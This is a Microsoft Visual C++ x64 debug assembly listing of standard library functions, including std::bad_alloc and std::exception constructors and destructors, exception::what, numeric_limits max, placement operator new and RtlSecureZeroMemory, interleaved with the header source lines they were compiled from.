; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??_Gbad_alloc@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 224
__flags$ = 232
??_Gbad_alloc@std@@UEAAPEAXI@Z PROC			; std::bad_alloc::`scalar deleting destructor', COMDAT
$LN4:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001e	e8 00 00 00 00	 call	 ??1bad_alloc@std@@UEAA@XZ
  00023	8b 85 e8 00 00
	00		 mov	 eax, DWORD PTR __flags$[rbp]
  00029	83 e0 01	 and	 eax, 1
  0002c	85 c0		 test	 eax, eax
  0002e	74 11		 je	 SHORT $LN2@scalar
  00030	ba 18 00 00 00	 mov	 edx, 24
  00035	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN2@scalar:
  00041	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??_Gbad_alloc@std@@UEAAPEAXI@Z ENDP			; std::bad_alloc::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??0bad_alloc@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 224
__that$ = 232
??0bad_alloc@std@@QEAA@AEBV01@@Z PROC			; std::bad_alloc::bad_alloc, COMDAT
$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR __that$[rbp]
  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ??0exception@std@@QEAA@AEBV01@@Z ; std::exception::exception
  0002b	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00032	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_alloc@std@@6B@
  00039	48 89 08	 mov	 QWORD PTR [rax], rcx
  0003c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00043	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
??0bad_alloc@std@@QEAA@AEBV01@@Z ENDP			; std::bad_alloc::bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??1bad_alloc@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1bad_alloc@std@@UEAA@XZ PROC				; std::bad_alloc::~bad_alloc, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001a	e8 00 00 00 00	 call	 ??1exception@std@@UEAA@XZ ; std::exception::~exception
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
??1bad_alloc@std@@UEAA@XZ ENDP				; std::bad_alloc::~bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0bad_alloc@std@@AEAA@QEBD@Z
_TEXT	SEGMENT
this$ = 224
_Message$ = 232
??0bad_alloc@std@@AEAA@QEBD@Z PROC			; std::bad_alloc::bad_alloc, COMDAT

; 130  :     {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 129  :         : exception(_Message, 1)

  00024	41 b8 01 00 00
	00		 mov	 r8d, 1
  0002a	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _Message$[rbp]
  00031	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00038	e8 00 00 00 00	 call	 ??0exception@std@@QEAA@QEBDH@Z ; std::exception::exception

; 130  :     {

  0003d	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_alloc@std@@6B@
  0004b	48 89 08	 mov	 QWORD PTR [rax], rcx

; 131  :     }

  0004e	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00055	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0005c	5f		 pop	 rdi
  0005d	5d		 pop	 rbp
  0005e	c3		 ret	 0
??0bad_alloc@std@@AEAA@QEBD@Z ENDP			; std::bad_alloc::bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??_Gexception@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 224
__flags$ = 232
??_Gexception@std@@UEAAPEAXI@Z PROC			; std::exception::`scalar deleting destructor', COMDAT
$LN4:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001e	e8 00 00 00 00	 call	 ??1exception@std@@UEAA@XZ ; std::exception::~exception
  00023	8b 85 e8 00 00
	00		 mov	 eax, DWORD PTR __flags$[rbp]
  00029	83 e0 01	 and	 eax, 1
  0002c	85 c0		 test	 eax, eax
  0002e	74 11		 je	 SHORT $LN2@scalar
  00030	ba 18 00 00 00	 mov	 edx, 24
  00035	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN2@scalar:
  00041	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??_Gexception@std@@UEAAPEAXI@Z ENDP			; std::exception::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ?what@exception@std@@UEBAPEBDXZ
_TEXT	SEGMENT
tv69 = 192
this$ = 240
?what@exception@std@@UEBAPEBDXZ PROC			; std::exception::what, COMDAT

; 94   :     {

$LN5:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 95   :         return _Data._What ? _Data._What : "Unknown exception";

  0001f	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 83 78 08 00	 cmp	 QWORD PTR [rax+8], 0
  0002b	74 14		 je	 SHORT $LN3@what
  0002d	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00034	48 8b 40 08	 mov	 rax, QWORD PTR [rax+8]
  00038	48 89 85 c0 00
	00 00		 mov	 QWORD PTR tv69[rbp], rax
  0003f	eb 0e		 jmp	 SHORT $LN4@what
$LN3@what:
  00041	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:??_C@_0BC@EOODALEL@Unknown?5exception@
  00048	48 89 85 c0 00
	00 00		 mov	 QWORD PTR tv69[rbp], rax
$LN4@what:
  0004f	48 8b 85 c0 00
	00 00		 mov	 rax, QWORD PTR tv69[rbp]

; 96   :     }

  00056	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0005d	5f		 pop	 rdi
  0005e	5d		 pop	 rbp
  0005f	c3		 ret	 0
?what@exception@std@@UEBAPEBDXZ ENDP			; std::exception::what
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??1exception@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1exception@std@@UEAA@XZ PROC				; std::exception::~exception, COMDAT

; 89   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7exception@std@@6B@
  0002d	48 89 08	 mov	 QWORD PTR [rax], rcx

; 90   :         __std_exception_destroy(&_Data);

  00030	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00037	48 83 c0 08	 add	 rax, 8
  0003b	48 8b c8	 mov	 rcx, rax
  0003e	e8 00 00 00 00	 call	 __std_exception_destroy

; 91   :     }

  00043	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
??1exception@std@@UEAA@XZ ENDP				; std::exception::~exception
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0exception@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 224
_Other$ = 232
??0exception@std@@QEAA@AEBV01@@Z PROC			; std::exception::exception, COMDAT

; 72   :     {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00024	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7exception@std@@6B@
  00032	48 89 08	 mov	 QWORD PTR [rax], rcx

; 71   :         : _Data()

  00035	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0003c	48 83 c0 08	 add	 rax, 8
  00040	48 8b f8	 mov	 rdi, rax
  00043	33 c0		 xor	 eax, eax
  00045	b9 10 00 00 00	 mov	 ecx, 16
  0004a	f3 aa		 rep stosb

; 73   :         __std_exception_copy(&_Other._Data, &_Data);

  0004c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00053	48 83 c0 08	 add	 rax, 8
  00057	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Other$[rbp]
  0005e	48 83 c1 08	 add	 rcx, 8
  00062	48 8b d0	 mov	 rdx, rax
  00065	e8 00 00 00 00	 call	 __std_exception_copy

; 74   :     }

  0006a	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00071	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00078	5f		 pop	 rdi
  00079	5d		 pop	 rbp
  0007a	c3		 ret	 0
??0exception@std@@QEAA@AEBV01@@Z ENDP			; std::exception::exception
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0exception@std@@QEAA@QEBDH@Z
_TEXT	SEGMENT
this$ = 224
_Message$ = 232
__formal$ = 240
??0exception@std@@QEAA@QEBDH@Z PROC			; std::exception::exception, COMDAT

; 66   :     {

$LN3:
  00000	44 89 44 24 18	 mov	 DWORD PTR [rsp+24], r8d
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00029	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00030	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7exception@std@@6B@
  00037	48 89 08	 mov	 QWORD PTR [rax], rcx

; 65   :         : _Data()

  0003a	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00041	48 83 c0 08	 add	 rax, 8
  00045	48 8b f8	 mov	 rdi, rax
  00048	33 c0		 xor	 eax, eax
  0004a	b9 10 00 00 00	 mov	 ecx, 16
  0004f	f3 aa		 rep stosb

; 67   :         _Data._What = _Message;

  00051	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00058	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Message$[rbp]
  0005f	48 89 48 08	 mov	 QWORD PTR [rax+8], rcx

; 68   :     }

  00063	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0006a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00071	5f		 pop	 rdi
  00072	5d		 pop	 rbp
  00073	c3		 ret	 0
??0exception@std@@QEAA@QEBDH@Z ENDP			; std::exception::exception
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\limits
;	COMDAT ?max@?$numeric_limits@_J@std@@SA_JXZ
_TEXT	SEGMENT
?max@?$numeric_limits@_J@std@@SA_JXZ PROC		; std::numeric_limits<__int64>::max, COMDAT

; 635  :     _NODISCARD static constexpr long long(max)() noexcept {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__09FBC026_limits
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 636  :         return LLONG_MAX;

  0001b	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH

; 637  :     }

  00025	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002c	5f		 pop	 rdi
  0002d	5d		 pop	 rbp
  0002e	c3		 ret	 0
?max@?$numeric_limits@_J@std@@SA_JXZ ENDP		; std::numeric_limits<__int64>::max
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_new.h
;	COMDAT ??2@YAPEAX_KPEAX@Z
_TEXT	SEGMENT
_Size$ = 224
_Where$ = 232
??2@YAPEAX_KPEAX@Z PROC					; operator new, COMDAT

; 168  :     {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__A3D3E4E8_vcruntime_new@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 169  :         (void)_Size;
; 170  :         return _Where;

  00024	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR _Where$[rbp]

; 171  :     }

  0002b	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00032	5f		 pop	 rdi
  00033	5d		 pop	 rbp
  00034	c3		 ret	 0
??2@YAPEAX_KPEAX@Z ENDP					; operator new
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
;	COMDAT RtlSecureZeroMemory
_TEXT	SEGMENT
vptr$ = 8
ptr$ = 256
cnt$ = 264
RtlSecureZeroMemory PROC				; COMDAT

; 21766: {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__FBBA8F9D_winnt@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 21767:     volatile char *vptr = (volatile char *)ptr;

  00024	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR ptr$[rbp]
  0002b	48 89 45 08	 mov	 QWORD PTR vptr$[rbp], rax

; 21768: 
; 21769: #if defined(_M_AMD64) && !defined(_M_ARM64EC)
; 21770: 
; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  0002f	48 8b 7d 08	 mov	 rdi, QWORD PTR vptr$[rbp]
  00033	33 c0		 xor	 eax, eax
  00035	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR cnt$[rbp]
  0003c	f3 aa		 rep stosb

; 21772: 
; 21773: #else
; 21774: 
; 21775:     while (cnt) {
; 21776: 
; 21777: #if !defined(_M_CEE) && (defined(_M_ARM) || defined(_M_ARM64) || defined(_M_ARM64EC))
; 21778: 
; 21779:         __iso_volatile_store8(vptr, 0);
; 21780: 
; 21781: #else
; 21782: 
; 21783:         *vptr = 0;
; 21784: 
; 21785: #endif
; 21786: 
; 21787:         vptr++;
; 21788:         cnt--;
; 21789:     }
; 21790: 
; 21791: #endif // _M_AMD64 && !defined(_M_ARM64EC)
; 21792: 
; 21793:     return ptr;

  0003e	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR ptr$[rbp]

; 21794: }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
RtlSecureZeroMemory ENDP
_TEXT	ENDS
END
